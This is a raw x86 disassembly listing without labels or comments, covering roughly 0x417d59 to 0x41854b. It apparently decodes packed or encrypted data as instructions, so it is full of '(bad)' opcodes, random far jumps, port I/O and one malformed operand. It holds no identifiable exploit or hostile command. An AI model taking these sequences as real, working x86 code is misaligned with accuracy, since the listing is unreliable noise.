  417d59:	or     al,0xc3
  417d5b:	fidivr DWORD PTR [edi+0x13c48bda]
  417d61:	sub    edi,DWORD PTR [ebx+0x619e7a09]
  417d67:	cli    
  417d68:	addr16 mov ebp,0xc3950a93
  417d6e:	into   
  417d6f:	lock push cs
  417d71:	das    
  417d72:	sar    edi,1
  417d74:	adc    eax,0xa5cbc926
  417d7a:	push   0x22
  417d7c:	lods   al,BYTE PTR ds:[esi]
  417d7d:	lods   al,BYTE PTR ds:[esi]
  417d7e:	mov    bh,0xca
  417d80:	sbb    ah,BYTE PTR ds:0xfe38d74e
  417d86:	jnp    0x417dee
  417d88:	fdivr  DWORD PTR [ecx+esi*2-0x6f]
  417d8c:	adc    eax,0xc37eb07e
  417d91:	add    eax,0x8049207d
  417d96:	loope  0x417d64
  417d98:	call   0x1f54052e
  417d9d:	xchg   ebp,eax
  417d9e:	dec    eax
  417d9f:	pop    ds
  417da0:	jo     0x417db5
  417da2:	mov    WORD PTR [eax+0x17],?
  417da5:	hlt    
  417da6:	outs   dx,BYTE PTR ds:[esi]
  417da7:	ins    BYTE PTR es:[edi],dx
  417da8:	jmp    0x417d76
  417daa:	ja     0x417d61
  417dac:	call   0x8577eb5b
  417db1:	mov    esp,0x2605ef82
  417db6:	scas   al,BYTE PTR es:[edi]
  417db7:	adc    eax,0xec6e5fc6
  417dbc:	jnp    0x417d40
  417dbe:	loop   0x417ded
  417dc0:	jmp    FWORD PTR [ecx]
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    eax,ds:0x12b18890
  417dc8:	pop    ecx
  417dc9:	pop    edi
  417dca:	loop   0x417d62
  417dcc:	add    ebp,DWORD PTR [ebx+0x54]
  417dcf:	mov    dl,0xe
  417dd1:	inc    edi
  417dd2:	popa   
  417dd3:	cdq    
  417dd4:	in     al,dx
  417dd5:	test   DWORD PTR [esi],edx
  417dd7:	jo     0x417dd9
  417dd9:	not    DWORD PTR es:[ebx-0x8b6e64b]
  417de0:	fucomp st(7)
  417de2:	xor    eax,0x8c1a7413
  417de7:	xor    BYTE PTR [ecx+0x714ca2d3],ch
  417ded:	xor    BYTE PTR [ecx-0x57820a50],bl
  417df3:	mov    dh,0xf2
  417df5:	inc    ecx
  417df6:	mov    eax,0x2c46cb6e
  417dfb:	(bad)  
  417dfc:	arpl   WORD PTR [ebx],sp
  417dfe:	ret    0xfb50
  417e01:	stc    
  417e02:	int3   
  417e03:	inc    ecx
  417e04:	jp     0x417dea
  417e06:	cmp    BYTE PTR [ebp+0x11],bh
  417e09:	aad    0x1a
  417e0b:	popa   
  417e0c:	push   ds
  417e0d:	es cwde 
  417e0f:	xchg   esp,eax
  417e10:	xor    eax,0xdd9311c8
  417e15:	cmp    bh,BYTE PTR [ecx-0x67668749]
  417e1b:	pop    ecx
  417e1c:	fcmovne st,st(0)
  417e1e:	repz rol edx,cl
  417e21:	push   0x49cd6083
  417e26:	jne    0x417e6e
  417e28:	pop    es
  417e29:	std    
  417e2a:	inc    ebp
  417e2b:	push   esi
  417e2c:	jae    0x417e4c
  417e2e:	in     al,dx
  417e2f:	cwde   
  417e30:	xor    eax,0x91eef3ba
  417e35:	push   esp
  417e36:	ss pop eax
  417e38:	mov    al,0xb5
  417e3a:	and    eax,0x94c1dbab
  417e3f:	push   cs
  417e40:	(bad)  
  417e41:	daa    
  417e42:	int    0x27
  417e44:	inc    edi
  417e45:	cmp    BYTE PTR [esi-0xf],al
  417e48:	lea    esi,[esi]
  417e4a:	call   0xc6e6:0x3de723ca
  417e51:	stos   BYTE PTR es:[edi],al
  417e52:	adc    DWORD PTR [ecx],0x964abb2d
  417e58:	test   eax,0x20679283
  417e5d:	mov    DWORD PTR [eax],esp
  417e5f:	add    BYTE PTR [esi],ah
  417e61:	pop    ds
  417e62:	outs   dx,BYTE PTR ds:[esi]
  417e63:	pop    edx
  417e64:	fidivr WORD PTR [esi+0x28]
  417e67:	je     0x417ea1
  417e69:	xchg   esp,eax
  417e6a:	add    ebx,DWORD PTR [ebp+0x3c]
  417e6d:	test   BYTE PTR [edx+0x40],bl
  417e70:	cmc    
  417e71:	fisttp WORD PTR [eax-0x48ce37e6]
  417e77:	mov    al,ds:0x622034cf
  417e7c:	lds    esi,FWORD PTR [ebx-0x790f996f]
  417e82:	cmp    eax,0xb9412110
  417e87:	xor    dl,dl
  417e89:	(bad)  
  417e8a:	int    0xe2
  417e8c:	cmp    BYTE PTR [eax-0x6b],dh
  417e8f:	mov    bl,0xd8
  417e91:	dec    ebp
  417e92:	pop    ds
  417e93:	mov    eax,ds:0x16721b16
  417e98:	add    eax,0x7cf925f1
  417e9d:	je     0x417e5b
  417e9f:	in     eax,dx
  417ea0:	mov    bh,0x51
  417ea2:	push   es
  417ea3:	or     cx,ax
  417ea6:	xor    eax,0x3fa721ca
  417eab:	xchg   ecx,eax
  417eac:	sub    eax,0xd9d125aa
  417eb1:	mov    edi,0x42c1b2e8
  417eb6:	sbb    al,0x52
  417eb8:	call   0x8095:0xfaa59b9a
  417ebf:	and    BYTE PTR [edx-0x4b6f698a],cl
  417ec5:	cmp    ebp,esi
  417ec7:	test   al,0x31
  417ec9:	push   ebp
  417eca:	outs   dx,DWORD PTR ds:[esi]
  417ecb:	fmul   QWORD PTR [eax+ecx*1+0x630e0e2c]
  417ed2:	xlat   BYTE PTR ds:[ebx]
  417ed3:	or     eax,0xa46ab843
  417ed8:	ret    0xacf2
  417edb:	jbe    0x417f40
  417edd:	adc    eax,0xf8853f65
  417ee2:	xlat   BYTE PTR ds:[ebx]
  417ee3:	stos   BYTE PTR es:[edi],al
  417ee4:	jns    0x417f06
  417ee6:	mov    ds:0x738c4b45,al
  417eeb:	sar    DWORD PTR [edi-0x30],cl
  417eee:	pusha  
  417eef:	or     al,0x64
  417ef1:	and    esp,esp
  417ef3:	loopne 0x417ef0
  417ef5:	ins    BYTE PTR es:[edi],dx
  417ef6:	and    eax,0xf74971b0
  417efb:	clc    
  417efc:	call   0x18e2:0xe488438c
  417f03:	and    al,BYTE PTR [edi]
  417f05:	mov    bl,0x5f
  417f07:	mov    bl,0xf3
  417f09:	cmc    
  417f0a:	inc    ebx
  417f0b:	in     eax,dx
  417f0c:	adc    DWORD PTR [esi-0x2e32d880],0xebde40c9
  417f16:	cmp    DWORD PTR [eax+esi*1+0x47],esi
  417f1a:	mov    ebx,0x4ec32a65
  417f1f:	dec    esp
  417f20:	pop    edx
  417f21:	lahf   
  417f22:	call   DWORD PTR [ecx]
  417f24:	xor    ebx,esp
  417f26:	mov    ecx,0xa3a9f380
  417f2b:	(bad)  
  417f2c:	ss xor eax,0x984aa567
  417f32:	fimul  WORD PTR [edx]
  417f34:	inc    edx
  417f35:	or     esp,DWORD PTR [edx-0x5b]
  417f38:	cwde   
  417f39:	mov    BYTE PTR ds:0xf6daa76e,ch
  417f3f:	sub    BYTE PTR [ecx+0x29],ch
  417f42:	adc    DWORD PTR [esi+0x4ea7f3b7],ebx
  417f48:	xchg   ebx,ecx
  417f4a:	test   eax,0xae48aa6a
  417f4f:	push   ecx
  417f50:	xor    BYTE PTR [edx+0x3af92642],dl
  417f56:	sub    al,0x9b
  417f58:	mov    al,ds:0xc2b92b2f
  417f5d:	cwde   
  417f5e:	stos   DWORD PTR es:[edi],eax
  417f5f:	jnp    0x417f98
  417f61:	ja     0x417ee6
  417f63:	xor    DWORD PTR [edx+0x14],ecx
  417f66:	data16 mov es,WORD PTR [ebx+0x76f957c8]
  417f6d:	adc    eax,0xf4d1b4c
  417f72:	sbb    DWORD PTR ds:0x47b1b0a3,edx
  417f78:	imul   esp,DWORD PTR [eax-0x58],0xffffffa8
  417f7c:	(bad)  
  417f7d:	and    eax,0x70a3a31c
  417f82:	out    0x59,al
  417f84:	repnz imul esp,eax,0x2dd45e84
  417f8b:	dec    esi
  417f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f8e:	pushf  
  417f8f:	inc    ebx
  417f90:	aad    0xe6
  417f92:	adc    BYTE PTR [eax+ecx*1],ch
  417f95:	pop    esi
  417f96:	or     al,0x78
  417f98:	inc    edi
  417f99:	(bad)  
  417f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f9b:	cmp    al,0xc
  417f9d:	bound  esi,QWORD PTR [ebx]
  417f9f:	xor    DWORD PTR [ebp+0x25115ed0],ebx
  417fa5:	pop    edi
  417fa6:	pop    ebp
  417fa7:	jg     0x417fd8
  417fa9:	pop    ebp
  417faa:	or     BYTE PTR [edi+0x56],al
  417fad:	int3   
  417fae:	fucomip st,st(2)
  417fb0:	scas   eax,DWORD PTR es:[edi]
  417fb1:	or     al,0x60
  417fb3:	fsubp  st(1),st
  417fb5:	add    ah,ah
  417fb7:	jae    0x417f4a
  417fb9:	lock add ecx,ebx
  417fbc:	adc    DWORD PTR [edx+esi*1],edx
  417fbf:	int    0xc5
  417fc1:	adc    ecx,ecx
  417fc3:	stc    
  417fc4:	bound  esi,QWORD PTR [ebp-0x4822aa16]
  417fca:	out    dx,eax
  417fcb:	add    al,0x37
  417fcd:	loop   0x417feb
  417fcf:	mov    ebx,0x8aebd425
  417fd4:	pusha  
  417fd5:	sbb    DWORD PTR [esi+esi*8+0x3f7f7202],esi
  417fdc:	test   DWORD PTR [ebp+0x79992322],eax
  417fe2:	mov    dh,0x18
  417fe4:	jne    0x418053
  417fe6:	nop
  417fe7:	or     esp,esi
  417fe9:	jae    0x417fe1
  417feb:	adc    ah,al
  417fed:	fadd   QWORD PTR ds:0x1523b3f1
  417ff3:	mov    bl,0x6
  417ff5:	js     0x418070
  417ff7:	iret   
  417ff8:	mov    bh,0x1f
  417ffa:	(bad)
  417ffe:	mov    ds:0x50ab4383,eax
  418003:	sbb    BYTE PTR fs:[ebx-0x29e3a9cf],0x22
  41800b:	pushf  
  41800c:	jns    0x418032
  41800e:	cmc    
  41800f:	shl    BYTE PTR [eax],1
  418011:	cmp    DWORD PTR [edx+0x21],edx
  418014:	and    DWORD PTR [ecx],edx
  418016:	adc    eax,0x6ff58bea
  41801b:	jbe    0x418068
  41801d:	mov    dh,0xe7
  41801f:	xchg   edx,eax
  418020:	aaa    
  418021:	xchg   ecx,eax
  418022:	cld    
  418023:	sub    cl,ah
  418025:	ret    
  418026:	cmp    ch,BYTE PTR ds:0x68b1bbea
  41802c:	out    0x42,al
  41802e:	dec    esi
  41802f:	sub    dh,cl
  418031:	es cmp eax,0x35cee925
  418037:	pop    edi
  418038:	rol    eax,cl
  41803a:	pop    ecx
  41803b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41803c:	mov    ecx,0x74864a69
  418041:	add    eax,0x3cd050a5
  418046:	ret    
  418047:	jmp    0x64c5:0xd4dc30ab
  41804e:	xor    esp,esp
  418050:	dec    esp
  418051:	inc    esi
  418052:	inc    edi
  418053:	xor    DWORD PTR [esi+0x94381b7],eax
  418059:	mov    ecx,DWORD PTR [esi-0x14d63c34]
  41805f:	push   edi
  418060:	sub    eax,0x132740aa
  418065:	push   esp
  418066:	shl    DWORD PTR [edx-0x26],1
  418069:	mov    ebx,0x2dddae4c
  41806e:	xstore-rng (bad)
  41806f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418070:	ret    
  418071:	xchg   esi,eax
  418072:	dec    edi
  418073:	jl     0x418082
  418075:	mov    ebp,DWORD PTR [edx]
  418077:	and    ah,BYTE PTR [eax]
  418079:	fstp   TBYTE PTR [ecx+0xb]
  41807c:	cwde   
  41807d:	repnz fild DWORD PTR [ebx]
  418080:	mov    edx,0x94a3f0e9
  418085:	mov    ebp,0xc33ea364
  41808a:	dec    eax
  41808b:	out    dx,al
  41808c:	mov    esi,0x5984676f
  418091:	xchg   esp,eax
  418092:	sahf   
  418093:	inc    edi
  418094:	and    dl,BYTE PTR [ebx]
  418096:	xor    ah,BYTE PTR [edx+0x409294c9]
  41809c:	pop    esp
  41809d:	sub    DWORD PTR [eax+edx*1],ebp
  4180a0:	in     eax,dx
  4180a1:	sbb    ebp,DWORD PTR [edi-0x2ab453e0]
  4180a7:	inc    ecx
  4180a8:	cmp    eax,0xda415556
  4180ad:	not    BYTE PTR [esi+0x35ea336a]
  4180b3:	push   es
  4180b4:	ins    DWORD PTR es:[edi],dx
  4180b5:	or     BYTE PTR [edi],dl
  4180b7:	dec    ecx
  4180b8:	(bad)  
  4180ba:	dec    DWORD PTR [edi]
  4180bc:	jnp    0x41807f
  4180be:	jne    0x418042
  4180c0:	mov    ds:0x1ae77b81,eax
  4180c5:	push   0xffffff97
  4180c7:	mov    bh,BYTE PTR [eax]
  4180c9:	or     eax,0x6cba396a
  4180ce:	sub    al,0xad
  4180d0:	mov    DWORD PTR ds:[eax+eiz*8],edx
  4180d4:	inc    ebp
  4180d5:	push   edi
  4180d6:	mov    ds:0xc1868600,al
  4180db:	mov    BYTE PTR [eax],cl
  4180dd:	mov    WORD PTR [ebx],ss
  4180df:	add    bh,BYTE PTR [edi]
  4180e1:	lea    ecx,[eax+edx*4+0x40dc1c8c]
  4180e8:	and    ebx,DWORD PTR [ecx-0x2d768e9]
  4180ee:	dec    esi
  4180ef:	dec    ebx
  4180f0:	sub    BYTE PTR ds:0xe656040f,0x49
  4180f7:	dec    ebx
  4180f8:	adc    al,0xb9
  4180fa:	bound  esp,QWORD PTR ds:0x699abc
  418100:	bound  esp,QWORD PTR [edx+0x3f]
  418103:	pusha  
  418104:	sub    BYTE PTR [edi-0x1b1c5d42],0x3
  41810b:	(bad)  
  41810c:	push   edx
  41810d:	cmp    al,0x22
  41810f:	or     DWORD PTR [eax+0x1b],0x4800cc09
  418116:	pop    ebx
  418117:	inc    eax
  418118:	and    eax,0xfc95cb72
  41811d:	xor    al,0x82
  41811f:	or     BYTE PTR [ebx+0x55ef9ca4],al
  418125:	or     BYTE PTR [edi-0x3b80cccf],dl
  41812b:	pushf  
  41812c:	les    esi,FWORD PTR [esi]
  41812e:	stc    
  41812f:	mov    dh,0xe4
  418131:	imul   ebx,DWORD PTR [eax+0x54b6ce56],0x75
  418138:	addr16 sbb eax,0xe91847ca
  41813e:	inc    edx
  41813f:	fucomi st,st(6)
  418141:	add    DWORD PTR [ebx+0x7b],ebp
  418144:	pop    DWORD PTR [ebx-0x70]
  418147:	push   ecx
  418148:	pop    ss
  418149:	inc    eax
  41814a:	fwait
  41814b:	push   edi
  41814c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41814d:	push   ecx
  41814e:	daa    
  41814f:	adc    al,0x31
  418151:	je     0x418160
  418153:	and    BYTE PTR [ebx+0x58085326],dh
  418159:	out    dx,eax
  41815a:	in     al,0x60
  41815c:	mov    ds:0xcda57027,eax
  418161:	in     eax,0xce
  418163:	fcomp  QWORD PTR [esi]
  418165:	fs stos BYTE PTR es:[edi],al
  418167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418168:	jp     0x418112
  41816a:	push   eax
  41816b:	pop    ecx
  41816c:	and    al,0xf2
  41816e:	in     al,0x28
  418170:	cld    
  418171:	add    edx,eax
  418173:	icebp  
  418174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418175:	sbb    eax,0xab979efa
  41817a:	dec    edx
  41817b:	scas   al,BYTE PTR es:[edi]
  41817c:	sub    DWORD PTR [ecx],esp
  41817e:	(bad)  
  41817f:	xchg   edx,eax
  418180:	pop    ebx
  418181:	cmc    
  418182:	dec    ecx
  418183:	inc    edx
  418184:	sub    BYTE PTR [ecx],ah
  418186:	mov    bl,0xad
  418188:	xchg   esp,eax
  418189:	ss xchg edx,eax
  41818b:	bt     DWORD PTR [eax+0x79],eax
  41818f:	leave  
  418190:	or     eax,0xdf261a2e
  418195:	lods   eax,DWORD PTR ds:[esi]
  418196:	cld    
  418197:	pop    esp
  418198:	adc    esp,DWORD PTR [esi+0xa317983]
  41819e:	push   0xf27d0a17
  4181a3:	les    esi,FWORD PTR [edi+esi*8+0x6a]
  4181a7:	and    DWORD PTR ds:0x6a91055c,edx
  4181ad:	cs shr dh,0x88
  4181b1:	fs mov ebp,0x3ed444af
  4181b7:	ret    
  4181b8:	mov    ecx,0x55e7164b
  4181bd:	dec    edi
  4181be:	cli    
  4181bf:	je     0x41823e
  4181c1:	test   BYTE PTR [eax-0x3e54ada2],bl
  4181c7:	bound  ecx,QWORD PTR [edx]
  4181c9:	fadd   st(7),st
  4181cb:	js     0x41822a
  4181cd:	adc    BYTE PTR [edi*8+0x2f092b19],0xd5
  4181d5:	xchg   ebx,eax
  4181d6:	test   BYTE PTR [esi],0x2d
  4181d9:	and    DWORD PTR [ecx+ebx*8-0x462096ea],edx
  4181e0:	div    DWORD PTR [ecx-0x6466f972]
  4181e6:	hlt    
  4181e7:	inc    ebp
  4181e8:	cli    
  4181e9:	dec    eax
  4181ea:	jp     0x4181e1
  4181ec:	push   esp
  4181ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ee:	das    
  4181ef:	adc    edx,DWORD PTR [ebx]
  4181f1:	(bad)  
  4181f3:	cmp    DWORD PTR ss:[ebx-0x3cdcb80b],edi
  4181fa:	sbb    eax,0x6bcf4df4
  4181ff:	jg     0x418217
  418201:	gs out dx,al
  418203:	in     eax,0xd3
  418205:	push   ecx
  418206:	jbe    0x418267
  418208:	fsubr  st(6),st
  41820a:	sbb    eax,0xc826242c
  41820f:	or     esp,DWORD PTR [ebx+0x67]
  418212:	addr16 popf 
  418214:	icebp  
  418215:	xor    al,0x93
  418217:	and    DWORD PTR [edi-0x40],ebp
  41821a:	sbb    eax,0xa03ed174
  41821f:	test   eax,0x949d4cb6
  418224:	dec    edx
  418225:	(bad)  
  418226:	(bad)  
  418228:	xchg   ecx,eax
  418229:	pop    edx
  41822a:	push   0x32
  41822c:	adc    DWORD PTR [edi+esi*2+0x1f],eax
  418230:	and    BYTE PTR [edi-0x42],bl
  418233:	push   edi
  418234:	arpl   WORD PTR [eax-0xf6f92ef],bx
  41823a:	mov    eax,0x6440671b
  41823f:	dec    ebx
  418240:	leave  
  418241:	pusha  
  418242:	stos   BYTE PTR es:[edi],al
  418243:	pop    esp
  418244:	and    al,0x76
  418246:	(bad)  
  418247:	mov    eax,0x8ba78909
  41824c:	retf   0xcaa3
  41824f:	ja     0x41822f
  418251:	fstp   TBYTE PTR [ecx+0x379c8c37]
  418257:	fs pop esi
  418259:	pop    es
  41825a:	es mov ebx,edi
  41825d:	mov    al,0x41
  41825f:	jmp    0xc183:0x2277b586
  418266:	mov    ah,0xb
  418268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418269:	ss sbb eax,0x71c12f67
  41826f:	shl    BYTE PTR ss:[ecx],0xe
  418273:	dec    ecx
  418274:	mov    ds:0x394769f0,eax
  418279:	sub    eax,0xd6ba5476
  41827e:	gs xor eax,0x97ebf308
  418284:	jae    0x418273
  418286:	inc    ebp
  418287:	cmc    
  418288:	mov    bh,BYTE PTR [ebx+0x23]
  41828b:	jo     0x4182a0
  41828d:	(bad)  
  41828e:	popa   
  41828f:	jmp    0x3f52:0x2f0efd88
  418296:	dec    BYTE PTR [edx-0x34]
  418299:	mov    bl,BYTE PTR [ebx+0x3a345630]
  41829f:	call   0x20ca:0xfdde4059
  4182a6:	push   cs
  4182a7:	mov    ds:0xd814f217,al
  4182ac:	push   ds
  4182ad:	xchg   ebp,eax
  4182ae:	cs mov esi,0x9ca1192f
  4182b4:	div    DWORD PTR [edi]
  4182b6:	hlt    
  4182b7:	rcr    BYTE PTR [edx+edi*8],cl
  4182ba:	inc    ecx
  4182bb:	stos   DWORD PTR es:[edi],eax
  4182bc:	int3   
  4182bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182be:	mov    edi,0xdcbad821
  4182c3:	ins    BYTE PTR es:[edi],dx
  4182c4:	sub    al,0xee
  4182c6:	mov    bl,0x4d
  4182c8:	fisttp WORD PTR [eax]
  4182ca:	mov    dl,0xa6
  4182cc:	cmp    dl,ch
  4182ce:	clc    
  4182cf:	(bad)  
  4182d0:	dec    edx
  4182d1:	fcmovu st,st(0)
  4182d3:	xlat   BYTE PTR ds:[ebx]
  4182d4:	dec    ecx
  4182d5:	inc    eax
  4182d6:	inc    ebx
  4182d7:	jmp    0x56a7:0xf7c734cd
  4182de:	enter  0xef9a,0x23
  4182e2:	fwait
  4182e3:	not    BYTE PTR [ecx+edi*4]
  4182e6:	das    
  4182e7:	adc    ch,cl
  4182e9:	mov    bh,0xc9
  4182eb:	mov    eax,0x63bfa51d
  4182f0:	out    0xcb,eax
  4182f2:	dec    esi
  4182f3:	mov    al,ds:0x7c2e5dd8
  4182f8:	jnp    0x418377
  4182fa:	push   0x5112f734
  4182ff:	inc    ecx
  418300:	dec    esi
  418301:	push   esp
  418302:	inc    eax
  418303:	fwait
  418304:	mov    eax,0xf970ee99
  418309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41830a:	cmp    BYTE PTR [edx-0x3f],ah
  41830d:	lea    edx,[ebp-0x6ca9c492]
  418313:	hlt    
  418314:	sahf   
  418315:	pop    ss
  418316:	pop    es
  418317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418318:	cld    
  418319:	adc    ah,0xdf
  41831c:	cmp    al,0xdc
  41831e:	cmp    edx,DWORD PTR [edi]
  418320:	in     al,dx
  418321:	popf   
  418322:	leave  
  418323:	mov    esi,0x4f9d519c
  418328:	add    dl,BYTE PTR [edi]
  41832a:	fsub   DWORD PTR [edx-0x4292e846]
  418330:	pop    ds
  418331:	jg     0x4183a3
  418333:	mov    al,0x84
  418336:	cmp    eax,0x2fe1fa65
  41833b:	sub    BYTE PTR [esi],0xa
  41833e:	fld    DWORD PTR [eax+edi*1-0x60938ba7]
  418345:	and    BYTE PTR [eax+0x2981b0da],ah
  41834b:	pop    ds
  41834c:	cld    
  41834d:	inc    edx
  41834e:	ja     0x418366
  418350:	push   esi
  418351:	push   eax
  418352:	jmp    0xc1d5:0xc8178bcb
  418359:	dec    eax
  41835a:	retf   0xb6b8
  41835d:	pop    edx
  41835e:	mov    esp,0xd787ea22
  418363:	mov    ah,0x13
  418365:	clc    
  418366:	leave  
  418367:	xchg   esi,eax
  418368:	mov    esi,0xf8b83c5c
  41836d:	dec    edi
  41836e:	out    0xe7,eax
  418370:	xchg   ebp,eax
  418371:	int    0xf
  418373:	cmp    BYTE PTR [edx-0x50],bh
  418376:	popa   
  418377:	shr    edx,0xe3
  41837a:	dec    edx
  41837b:	popf   
  41837c:	adc    eax,esp
  41837e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41837f:	outs   dx,BYTE PTR ds:[esi]
  418380:	xor    al,bl
  418382:	mov    al,ss:0x9f8c51f7
  418388:	xor    DWORD PTR [eax],eax
  41838a:	retf   0x7d91
  41838d:	dec    ecx
  41838e:	or     ch,BYTE PTR [ecx+0x6a3bec12]
  418394:	dec    ebx
  418395:	cli    
  418396:	daa    
  418397:	and    BYTE PTR [ecx-0x7],bl
  41839a:	sbb    ecx,DWORD PTR ds:[esi+0x69]
  41839e:	pusha  
  41839f:	shl    DWORD PTR [ebx+0xd11cdf7],cl
  4183a5:	xchg   esi,eax
  4183a6:	dec    ecx
  4183a7:	retf   
  4183a8:	neg    DWORD PTR [ecx]
  4183aa:	imul   ebx,DWORD PTR [edi-0x13c2dbfa],0x21
  4183b1:	sti    
  4183b2:	pop    es
  4183b3:	outs   dx,BYTE PTR ds:[esi]
  4183b4:	pusha  
  4183b5:	inc    edi
  4183b6:	xor    BYTE PTR [ecx+ecx*2-0x60],cl
  4183ba:	dec    ecx
  4183bb:	or     ebx,DWORD PTR ds:0x6871e001
  4183c1:	xchg   ebp,eax
  4183c2:	popa   
  4183c3:	add    DWORD PTR [esi+0x78],0x81d84553
  4183ca:	std    
  4183cb:	enter  0x2a38,0x30
  4183cf:	push   esp
  4183d0:	scas   al,BYTE PTR es:[edi]
  4183d1:	arpl   WORD PTR [ebp-0x786e564a],bx
  4183d7:	or     bh,BYTE PTR [esi]
  4183d9:	into   
  4183da:	cli    
  4183db:	retf   0x30d0
  4183de:	jns    0x418379
  4183e0:	(bad)  
  4183e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183e2:	cs pop edi
  4183e4:	addr16 push es
  4183e6:	ror    BYTE PTR [ecx-0x1caff11a],0xe2
  4183ed:	les    ecx,FWORD PTR [ecx]
  4183ef:	mov    eax,0xb35d6449
  4183f4:	pop    es
  4183f5:	ins    DWORD PTR es:[edi],dx
  4183f6:	fiadd  DWORD PTR [edi]
  4183f8:	inc    eax
  4183f9:	sbb    bl,BYTE PTR [ebx]
  4183fb:	fs push ss
  4183fd:	xor    DWORD PTR [ebp+0x32],edx
  418400:	mov    ds:0x84c1b6c3,eax
  418405:	or     edi,eax
  418407:	ss xchg ebx,eax
  418409:	ins    BYTE PTR es:[edi],dx
  41840a:	lods   eax,DWORD PTR ds:[esi]
  41840b:	xchg   ebx,eax
  41840c:	sbb    dl,BYTE PTR [edi-0x10]
  41840f:	pushf  
  418410:	or     edx,DWORD PTR [esi]
  418412:	xchg   DWORD PTR [ecx+0x7e9c92e2],ebp
  418418:	lea    edi,[edi+edi*2+0x6815623]
  41841f:	int    0xcc
  418421:	push   edx
  418422:	sbb    eax,0x40d5db0
  418427:	loop   0x4184a1
  418429:	or     al,BYTE PTR [ebx-0x69]
  41842c:	outs   dx,DWORD PTR gs:[esi]
  41842e:	jp     0x4183d7
  418430:	push   esi
  418431:	adc    cl,BYTE PTR [eax-0x1860989d]
  418437:	fcom   QWORD PTR [edi+esi*1+0x6b]
  41843b:	fst    QWORD PTR [eax]
  41843d:	jge    0x418457
  41843f:	pop    es
  418440:	aad    0x69
  418442:	push   es
  418443:	inc    edi
  418444:	add    ch,BYTE PTR [ebx-0x15]
  418447:	or     BYTE PTR [edi+0x11320ce0],0x4e
  41844e:	ret    0x1ae
  418451:	mov    ebp,0xe0c8d532
  418456:	pop    edx
  418457:	cmc    
  418458:	lock xchg BYTE PTR [eax-0x63],ah
  41845c:	call   edx
  41845e:	inc    esp
  41845f:	add    DWORD PTR [ecx-0xbafa29b],edx
  418465:	push   ebx
  418466:	leave  
  418467:	dec    esp
  418468:	call   0x6205:0x821adbaa
  41846f:	pop    esp
  418470:	std    
  418471:	mov    ch,0x87
  418473:	dec    edx
  418474:	and    al,0xec
  418476:	mov    edx,DWORD PTR [esi]
  418478:	out    dx,eax
  418479:	cdq    
  41847a:	jo     0x418449
  41847c:	cmp    al,0xea
  41847e:	out    0x78,eax
  418480:	in     al,0x36
  418482:	dec    edi
  418483:	out    dx,eax
  418484:	mov    ebx,0x1da65d99
  418489:	sub    eax,DWORD PTR [esi+0x34]
  41848c:	fidiv  WORD PTR [edi+0x6b92db9e]
  418492:	cmp    DWORD PTR [ebx*8+0xf688ce2],esp
  418499:	adc    al,0xf0
  41849b:	loope  0x418500
  41849d:	push   ebp
  41849e:	mov    DWORD PTR [ecx+0x40],esi
  4184a1:	sbb    DWORD PTR [eax+0x6],esp
  4184a4:	enter  0x296a,0x5f
  4184a8:	test   BYTE PTR [eax+0x74],cl
  4184ab:	ror    esi,cl
  4184ad:	lock nop
  4184af:	test   DWORD PTR [edi+0x14930620],ecx
  4184b5:	jp     0x418452
  4184b7:	dec    esp
  4184b8:	stos   BYTE PTR es:[edi],al
  4184b9:	pop    ebx
  4184ba:	mov    eax,ds:0xe7909019
  4184bf:	int3   
  4184c0:	stc    
  4184c1:	hlt    
  4184c2:	fisttp WORD PTR [ebp+0x32cf2ed4]
  4184c8:	pop    ds
  4184c9:	lock ret 0x92fd
  4184cd:	mov    bh,0xb1
  4184cf:	fwait
  4184d0:	xor    al,0xc7
  4184d2:	jg     0x418550
  4184d4:	xor    DWORD PTR [edi+edx*2+0x4f],esp
  4184d8:	push   cs
  4184d9:	lds    eax,FWORD PTR [ebp-0x47f9d796]
  4184df:	dec    ecx
  4184e0:	es sahf 
  4184e2:	xor    dl,BYTE PTR [ecx-0x1f]
  4184e5:	sub    al,0x81
  4184e7:	push   esi
  4184e8:	push   eax
  4184e9:	jl     0x418526
  4184eb:	jne    0x418565
  4184ed:	popf   
  4184ee:	je     0x418529
  4184f0:	sbb    BYTE PTR [esi+0x58],dh
  4184f3:	jb     0x4184d1
  4184f5:	pop    eax
  4184f6:	jl     0x41851a
  4184f8:	mov    bh,0xbc
  4184fa:	mov    ah,al
  4184fc:	imul   ebp,DWORD PTR [edi],0xffffffd0
  4184ff:	stos   DWORD PTR es:[edi],eax
  418500:	mov    esp,0x503f9f8b
  418505:	loop   0x4184df
  418507:	andps  xmm6,XMMWORD PTR [ebx]
  41850a:	test   edi,eax
  41850c:	mov    ecx,0xe1567315
  418511:	jbe    0x418542
  418513:	mov    bh,0x75
  418515:	loopne 0x41854d
  418517:	push   ebx
  418518:	push   ebp
  418519:	xchg   ebx,eax
  41851a:	test   al,0xbf
  41851c:	dec    esp
  41851d:	sub    al,0x46
  41851f:	mov    al,0xd5
  418521:	rcl    BYTE PTR [eax+0x4bb53c4a],1
  418527:	aad    0xfb
  418529:	xor    al,0x4e
  41852b:	xchg   esi,eax
  41852c:	imul   BYTE PTR [edi]
  41852e:	imul   ebx,DWORD PTR [esi-0x12],0x5e
  418532:	jp     0x4184c1
  418534:	pop    edi
  418535:	sti    
  418536:	bound  esi,QWORD PTR [edx]
  418538:	push   esi
  418539:	imul   eax,DWORD PTR [ecx+0xfec4812],0x36bd6c78
  418543:	adc    eax,DWORD PTR [edi+0x2d]
  418546:	and    al,0x51
  418548:	sub    al,0xe2
  41854a:	inc    esi
  41854b:	cs or  eax,0x3c74f36
